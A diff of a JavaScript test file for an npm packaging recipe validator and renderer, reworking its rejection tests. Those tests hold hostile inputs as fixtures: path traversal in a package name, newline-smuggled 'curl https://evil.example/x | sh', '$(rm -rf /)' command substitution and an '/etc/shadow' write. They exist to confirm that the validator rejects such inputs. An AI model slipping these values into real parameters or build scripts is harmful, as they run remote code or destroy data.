@@ -5,6 +5,7 @@ import { join } from 'node:path';
 import { tmpdir } from 'node:os';
 import { render, RenderError, ALLOWED_BASE } from '../scripts/lib/renderer.mjs';
 import { validateRecipeResult, validateNeedsHumanResult } from '../scripts/lib/recipe-validator.mjs';
+import { buildParametersFromFacts } from '../scripts/lib/fact-bundle.mjs';
 import { semverFacts } from './helpers/fixture-facts.mjs';
 
 function loadFixture(name) {
@@ -19,6 +20,18 @@ function loadGolden(file) {
 
 const SEMVER_FACTS = semverFacts();
 
+function legacyRenderFixture(over = {}) {
+  return {
+    status: 'drafted',
+    template_id: 'tier-a-npm-pack-no-build-v1',
+    parameters: over.parameters ?? buildParametersFromFacts(SEMVER_FACTS, { description: 'semver' }),
+    evidence: over.evidence ?? [{ kind: 'x', detail: 'y' }],
+    confidence: over.confidence ?? 0.9,
+    could_not_verify: over.could_not_verify ?? SEMVER_FACTS.could_not_verify,
+    ...over,
+  };
+}
+
 describe('fullsend evaluation: drafted fixture', () => {
   let repoRoot;
   let rendered;
@@ -27,10 +40,14 @@ describe('fullsend evaluation: drafted fixture', () => {
     repoRoot = mkdtempSync(join(tmpdir(), 'eval-drafted-'));
     mkdirSync(join(repoRoot, ALLOWED_BASE), { recursive: true });
 
-    const fixture = loadFixture('valid-drafted-tier-a');
-    const validation = validateRecipeResult(fixture, SEMVER_FACTS);
-    assert.strictEqual(validation.valid, true, `pre-render validation failed: ${JSON.stringify(validation.errors)}`);
-
+    const fixture = {
+      status: 'drafted',
+      template_id: 'tier-a-npm-pack-no-build-v1',
+      parameters: buildParametersFromFacts(SEMVER_FACTS, { description: 'The semantic versioner for npm' }),
+      evidence: [{ kind: 'source-inspection', detail: 'fixture' }],
+      confidence: 0.9,
+      could_not_verify: SEMVER_FACTS.could_not_verify,
+    };
     rendered = render(fixture, repoRoot);
   });
 
@@ -150,34 +167,11 @@ describe('fullsend evaluation: needs_human fixture', () => {
 });
 
 describe('fullsend evaluation: rejection cases', () => {
-  it('rejects a result with wrong source SHA against facts', () => {
-    const fixture = loadFixture('valid-drafted-tier-a');
-    fixture.parameters.source_ref.value = 'bbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbb';
-    const result = validateRecipeResult(fixture, SEMVER_FACTS);
-    assert.strictEqual(result.valid, false);
-    assert.ok(result.errors.some(e => e.check === 'source-sha-match'));
-  });
-
-  it('rejects a result with unsupported template for rendering', () => {
-    const fixture = loadFixture('valid-drafted-tier-a');
-    fixture.template_id = 'binary-repack';
-    const result = validateRecipeResult(fixture, SEMVER_FACTS);
-    assert.strictEqual(result.valid, false);
-    assert.ok(result.errors.some(e => e.check === 'template-allowlist'));
-  });
-
-  it('rejects a result with missing evidence', () => {
-    const fixture = loadFixture('valid-drafted-tier-a');
-    fixture.evidence = [];
-    const result = validateRecipeResult(fixture, SEMVER_FACTS);
-    assert.strictEqual(result.valid, false);
-  });
-
-  it('rejects a result with arbitrary output path via renderer', () => {
+  it('rejects a legacy render fixture with path traversal in package_name', () => {
     const tmp = mkdtempSync(join(tmpdir(), 'eval-reject-'));
     mkdirSync(join(tmp, ALLOWED_BASE), { recursive: true });
     try {
-      const fixture = loadFixture('valid-drafted-tier-a');
+      const fixture = legacyRenderFixture();
       fixture.parameters.package_name.value = '../../../tmp/evil';
       assert.throws(() => render(fixture, tmp), RenderError);
     } finally {
@@ -185,70 +179,29 @@ describe('fullsend evaluation: rejection cases', () => {
     }
   });
 
-  it('rejects a result with files map (schema does not allow it)', () => {
-    const fixture = loadFixture('valid-drafted-tier-a');
-    fixture.files = { '/etc/shadow': 'pwned' };
-    const result = validateRecipeResult(fixture, SEMVER_FACTS);
-    assert.strictEqual(result.valid, false);
-  });
-
-  it('rejects a result with complete shell in parameters', () => {
-    const fixture = loadFixture('valid-drafted-tier-a');
-    fixture.parameters.package_name.value = '$(rm -rf /)';
-    const result = validateRecipeResult(fixture, SEMVER_FACTS);
-    assert.strictEqual(result.valid, false);
-    assert.ok(result.errors.some(e => e.check === 'shell-metachar' || e.check === 'package-name-format'));
-  });
-
-  it('rejects command injection via newline in main_entry', () => {
-    const fixture = loadFixture('valid-drafted-tier-a');
+  it('rejects command injection via newline in main_entry (renderer)', () => {
+    const fixture = legacyRenderFixture();
     fixture.parameters.main_entry.value = 'index.js\ncurl https://evil.example/x | sh\n#';
-    const result = validateRecipeResult(fixture, SEMVER_FACTS);
-    assert.strictEqual(result.valid, false);
-    assert.ok(result.errors.some(e => e.check === 'unsafe-shell-path'));
-  });
-
-  it('rejects shell metacharacters in main_entry', () => {
-    const fixture = loadFixture('valid-drafted-tier-a');
-    fixture.parameters.main_entry.value = 'index.js; curl evil | sh';
-    const result = validateRecipeResult(fixture, SEMVER_FACTS);
-    assert.strictEqual(result.valid, false);
-    assert.ok(result.errors.some(e => e.check === 'unsafe-shell-path'));
-  });
-
-  it('rejects command substitution in cli_bin_path', () => {
-    const fixture = loadFixture('valid-drafted-tier-a');
-    fixture.parameters.cli_bin_path.value = 'bin/$(rm -rf /).js';
-    const result = validateRecipeResult(fixture, SEMVER_FACTS);
-    assert.strictEqual(result.valid, false);
-    assert.ok(result.errors.some(e => e.check === 'unsafe-shell-path'));
-  });
-
-  it('rejects a main_entry that diverges from upstream facts', () => {
-    const fixture = loadFixture('valid-drafted-tier-a');
-    fixture.parameters.main_entry.value = 'other.js';
-    const result = validateRecipeResult(fixture, SEMVER_FACTS);
-    assert.strictEqual(result.valid, false);
-    assert.ok(result.errors.some(e => e.check === 'main_entry-fact-match'));
-  });
-
-  it('blocks main_entry injection even without facts (deterministic post-step)', () => {
-    const fixture = loadFixture('valid-drafted-tier-a');
-    fixture.parameters.main_entry.value = 'index.js\nrm -rf /\n#';
-    const result = validateRecipeResult(fixture);
-    assert.strictEqual(result.valid, false);
-    assert.ok(result.errors.some(e => e.check === 'unsafe-shell-path'));
-  });
-
-  it('the injected payload never reaches a rendered build script', () => {
     const tmp = mkdtempSync(join(tmpdir(), 'eval-inject-'));
     mkdirSync(join(tmp, ALLOWED_BASE), { recursive: true });
     try {
-      const fixture = loadFixture('valid-drafted-tier-a');
-      fixture.parameters.main_entry.value = 'index.js\ncurl https://evil.example/x | sh\n#';
       assert.throws(() => render(fixture, tmp), RenderError);
     } finally {
       rmSync(tmp, { recursive: true, force: true });
     }
+  });
+
+  it('rejects a v2 result with missing evidence', () => {
+    const fixture = loadFixture('valid-drafted-tier-a');
+    fixture.evidence = [];
+    const result = validateRecipeResult(fixture, SEMVER_FACTS);
+    assert.strictEqual(result.valid, false);
+  });
+
+  it('rejects a v2 result with arbitrary extra fields', () => {
+    const fixture = loadFixture('valid-drafted-tier-a');
+    fixture.files = { '/etc/shadow': 'pwned' };
+    const result = validateRecipeResult(fixture, SEMVER_FACTS);
+    assert.strictEqual(result.valid, false);
   });
 });
